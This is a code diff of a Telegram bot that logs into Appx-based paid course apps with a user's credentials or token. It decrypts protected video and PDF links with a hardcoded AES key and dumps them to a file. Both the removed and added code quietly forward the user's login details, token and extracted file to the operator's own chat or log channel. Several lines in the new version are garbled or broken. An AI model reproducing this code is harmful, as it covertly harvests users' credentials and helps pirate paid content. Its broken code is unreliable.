@@ -1,121 +1,164 @@
-import requests as r
-import re
-import json
-from handlers import *
-from weasyprint import HTML
-from jinja2 import Template
-from pyrogram.types import InputMediaDocument
-import subprocess
-from pyrogram.types.messages_and_media import message
-from pyromod import listen
-from pyrogram.types import Message
-import pyrogram
-from pyrogram import Client, filters
-from pyrogram import Client as bot
-from pyrogram.types.messages_and_media import message
-from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
-from pyrogram.errors import FloodWait
-from pyrogram.types import User, Message
-import logging
-import main
-import config
 import asyncio
-import os
-import base64
-import cloudscraper
+import aiohttp
+import json
 from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+from base64 import b64decode
+from pyrogram import filters
+import cloudscraper
+from Extractor import app
+import os
+from config import SUDO_USERS
+import base64
+log_channel = (-1002363250260)
+def decrypt(enc):
+    enc = b64decode(enc.split(':')[0])
+    key = '638udh3829162018'.encode('utf-8')
+    iv = 'fedcba9876543210'.encode('utf-8')
+    if len(enc) == 0:
+        return ""
 
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    plaintext = unpad(cipher.decrypt(enc), AES.block_size)
+    return plaintext.decode('utf-8')
 
-def get_link(cid, pid, cname, raw_text05, hdr):
-      resp = r.get(f'https://{raw_text05}/get/folder_contentsv2?course_id={cid}&parent_id={pid}', headers=hdr).json()["data"]
-      for data in resp:                        
-             if ((data["material_type"]) != "FOLDER") and ((data["file_link"]) != ""):                 
-                 file_link = (data["file_link"])
-                 title, file_link, pdf_link, pdf_link2 = (data["Title"]), decrypt(file_link.split(":")[0]), decrypt((data["pdf_link"]).split(":")[0]), decrypt((data["pdf_link2"]).split(":")[0])
-                 video_link = f'{title.replace(":","")} : {file_link}'
-                 if pdf_link and (pdf_link != file_link):
-                        video_link += f'\n{title.replace(":","")} (pdf) : {pdf_link}'
-                 if pdf_link2:
-                        video_link += f'\n{title.replace(":","")} (pdf-2) : {pdf_link2}'
-                 open(f"{cname}.txt", "a").write(f"{video_link}\n")  
-             else:
-                  pid = (data["id"])
-                  get_link(cid, pid, cname, raw_text05, hdr)       
-                  
+def decode_base64(encoded_str):
+    try:
+        decoded_bytes = base64.b64decode(encoded_str)
+        decoded_str = decoded_bytes.decode('utf-8')
+        return decoded_str
+    except Exception as e:
+        return f"Error decoding string: {e}"
 
-async def appex_v2_txt(bot, m):
-    editable = await bot.send_message(m.chat.id, "Send Your Folder **APPX APPLICATION API**\nLike `Aman Vashisht Yodha Uc Live` etc")
-    input01: Message = await bot.listen(editable.chat.id)
-    raw_text05 = input01.text
-    await input01.delete(True)
-    await editable.edit("Send **ID & Password** in this manner otherwise bot will not reply.\n\nSend like this »  ID*Password.")
-    login_hdr = {
-        'Client-Service': 'Appx',
-        'Auth-Key': 'appxapi',
-        'User-ID': '-2',
-        'language': 'en',
-        'device_type': 'ANDROID',
-        'Host': f'{raw_text05}',
-        'Connection': 'Keep-Alive',
-        'User-Agent': 'okhttp/4.9.1',
-    }
-    
-    data = {
-        'email': '',
-        'password': '',
-        'devicetoken': 'evxVp-BBB3I:APA91bFSglfbsDx7kYeVNnOszxud1cUyXj-p54ejyaSvItmM7p5EPH9iyZKKk0N66gROVI3cRWVg1Bvy4tuBsU1VPulrjKqoiF644NI9dqKUswrnOc5TLd0ZHrTZsgy6tSLpcG6OMz7F',
-        'mydeviceid': 'e4be9d04e8ca6e44',
-    }
-    input: Message = await bot.listen(editable.chat.id)
-    raw_text = input.text
-    await input.delete(True)
-    if "*" in raw_text:
-        data["email"] = raw_text.split("*")[0]
-        data["password"] = raw_text.split("*")[1]    
-        scraper = cloudscraper.create_scraper()	
-        html = scraper.post("https://"+raw_text05+"/post/userLogin", data, headers=login_hdr).content
-        output = json.loads(html)
-        token = output["data"]["token"]
-        userid = output["data"]["userid"]
-    else:
-        token = raw_text.split("$")[0]
-        userid = raw_text.split("$")[1]
-    
+async def fetch_item_details(session, api, course_id, item, headers, f):
+    fi = item.get("id")
+    t = item.get("Title")
+    async with session.get(f"https://{api}/get/fetchVideoDetailsById?course_id={course_id}&folder_wise_course=1&ytflag=0&video_id={fi}", headers=headers) as response:
+        r4 = await response.json()
+        vt = r4["data"].get("Title", "")
+        vl = r4["data"].get("download_link", "")
+        if vl:
+            dvl = decrypt(vl)
+            print(f"{vt}:{dvl}")
+            f.write(f"{vt}:{dvl}\n")
+        else:
+            encrypted_links = r4["data"].get("encrypted_links", [])
+            for link in encrypted_links:
+                a = link.get("path")
+                k = link.get("key")
+                if a and k:
+                    k1 = decrypt(k)
+                    k2 = decode_base64(k1)
+                    da = decrypt(a)
+                    print(f"{vt}:{da}*{k2}")
+                    f.write(f"{vt}:{da}*{k2}\n")
+                    break
+        if "material_type" in r4["data"]:
+            mt = r4["data"]["material_type"]
+            if mt == "VIDEO":
+                p1 = r4["data"].get("pdf_link", "")
+                p2 = r4["data"].get("pdf_link2", "")
+                if p1:
+                    dp1 = decrypt(p1)
+                    print(f"{vt}:{dp1}")
+                    f.write(f"{vt}:{dp1}\n")
+                if p2:
+                    dp2 = decrypt(p2)
+                    print(f"{vt}:{dp2}")
+                    f.write(f"{vt}:{dp2}\n")
+
+async def fetch_folder_contents(session, api, course_id, folder_id, headers, f):
+    async with session.get(f"https://{api}/get/folder_contentsv2?course_id={course_id}&parent_id={folder_id}", headers=headers) as response:
+        j = await response.json()
+        tasks = []
+        if "data" in j:
+            for item in j["data"]:
+                mt = item.get("material_type")
+                tasks.append(fetch_item_details(session, api, course_id, item, headers, f))
+                if mt == "FOLDER":
+                    tasks.append(fetch_folder_contents(session, api, course_id, item["id"], headers, f))
+        await asyncio.gather(*tasks)
+
+async def appex_v2_txt(app, message, api, name):
+    raw_url = f"https://{api}/post/userLogin"
     hdr = {
-        'Client-Service': 'Appx',
-        'Auth-Key': 'appxapi',
-        'User-ID': userid,
-        'Authorization': token,
-        'language': 'en',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Host': f'{raw_text05}',
-        'Connection': 'Keep-Alive',
-        'User-Agent': 'okhttp/4.9.1',
-    }        
-
-    scraper = cloudscraper.create_scraper()
-    params = (
-    ('userid', f'{userid}'),
-    )
-    html1 = scraper.get("https://"+raw_text05+"/get/mycoursev2", headers=hdr, params=params).json()["data"]
-    cool = ""
-    for data in html1:
-        aa = f" {data['id']} » {data['course_name']} ❇️ ₹{data['price']}\n\n"
-        if len(f'{cool}{aa}') > 4096:
-            print(aa)
-            cool = ""
-        cool += aa
-    await bot.send_message(my_data, f"**Api :** `{raw_text05}`\n\n**ID * Pass :** `{raw_text}`\n\n**Token :** `{token}${userid}`\n\n{cool}")
-    await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
-    input1 = await bot.listen(editable.chat.id)
-    raw_text1 = input1.text
-    await input1.delete(True)
+        "Auth-Key": "appxapi",
+        "User-Id": "-2",
+        "Authorization": "",
+        "User_app_category": "",
+        "Language": "en",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Accept-Encoding": "gzip, deflate",
+        "User-Agent": "okhttp/4.9.1"
+    }
+    info = {"email": "", "password": ""}
+    input1 = await app.ask(message.chat.id, text="Send ID & Password in this manner, otherwise, the bot will not respond.\n\nSend like this: ID*Password\n\nOr send your Token directly.")
+    raw_text = input1.text
     
-        caption_details = raw_text05.replace("api.classx.co.in", "").replace("api.teachx.co.in", "").replace("api.appx.co.in", "").replace("api.teachx.in", "").upper()
-        file1 = InputMediaDocument(f"{cname}.txt", caption=f"**AppName :-** `{caption_details}`\n**BatchName :-** `{cid}` `{cname}`")   
-       #file1 = InputMediaDocument(f"{cname}.txt", caption = f"**App Name :** {raw_text05.upper().replace("api.classx.co.in", "").replace("api.teachx.co.in", "").replace("api.appx.co.in", "")}\n**Batch Name :** `{cid}` `{cname}`")
-        await bot.send_media_group(m.chat.id, [file1])
+    if '*' in raw_text:
+        info["email"] = raw_text.split("*")[0]
+        info["password"] = raw_text.split("*")[1]
+        await input1.delete(True)
+           try:
+            scraper = cloudscraper.create_scraper()
+            res = scraper.post(raw_url, data=info, headers=hdr).content
+            output = json.loads(res)
+            userid = output["data"]["userid"]
+            token = output["data"]["token"]
+        except Exception as e:
+            print(f"An error occurred: {str(e)}")
+            return await message.reply_text("Please try again later. Maybe Password Wrong")
+    else:
+        token = raw_text
+        # Assuming the userid is available through some means when using token directly
+        # Adjust the method to obtain userid if required
+        userid = "extracted_userid_from_token"
+
+    hdr1 = {
+        "Client-Service": "Appx",
+        "source": "website",
+        "Auth-Key": "appxapi",
+        "Authorization": token,
+        "User-ID": userid
+    }
+    
+    await message.reply_text(" Login Successful✅")
+    
+    async with aiohttp.ClientSession() as session:
+        async with session.get(f"https://{api}/get/get_all_purchases?userid={userid}&item_type=10", headers=hdr1) as res1:
+            j1 = await res1.json()
+
+        FFF = "COURSE-ID  -  COURSE NAME\n\n"
+        if "data" in j1:
+            for item in j1["data"]:
+                for ct in item["coursedt"]:
+                    i = ct.get("id")
+                    cn = ct.get("course_name")
+                    FFF += f"**{i}   -   {cn}**\n\n"
+
+        await message.reply_texYOU HAVE THESE COURSES:S:**\n\n'{token}'\n\n{FFF}")
         
-        os.remove(f"{cname}.txt")
-        await bot.send_message(m.chat.id, "Batch Grabbing Done 🔰")
-        
+        input2 = await app.ask(message.chat.id, teNow send the Course ID to Downloadad**")
+        raw_text2 = input2.text
+        await message.reply_text("wait extracting your batch")
+        dl=(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅ for {api}\n\n{token}\n{FFF}")
+        async with session.get(f"https://{api}/get/folder_contentsv2?course_id={raw_text2}&parent_id=-1", headers=hdr1) as res2:
+            j2 = await res2.json()
+        await app.send_message(log_channel, dl)
+        course_name = next((ct.get("course_name") for item in j1["data"] for ct in item["coursedt"] if ct.get("id") == raw_text2), "Course")
+        sanitized_course_name = "".join(c if c.isalnum() else "_" for c in course_name)
+        filename = f"{sanitized_course_name}.txt"
+
+        with open(filename, 'w') as f:
+            tasks = []
+            if "data" in j2:
+                for item in j2["data"]:
+                    tasks.append(fetch_item_details(session, api, raw_text2, item, hdr1, f))
+                    if item["material_type"] == "FOLDER":
+                        tasks.append(fetch_folder_contents(session, api, raw_text2, item["id"], hdr1, f))
+            await asyncio.gather(*tasks)
+ 
+        await app.send_document(message.chat.id, filename)
+        await app.send_document(log_channel, filename)
+        os.remove(filename)
+        await message.reply_text("Done✅")
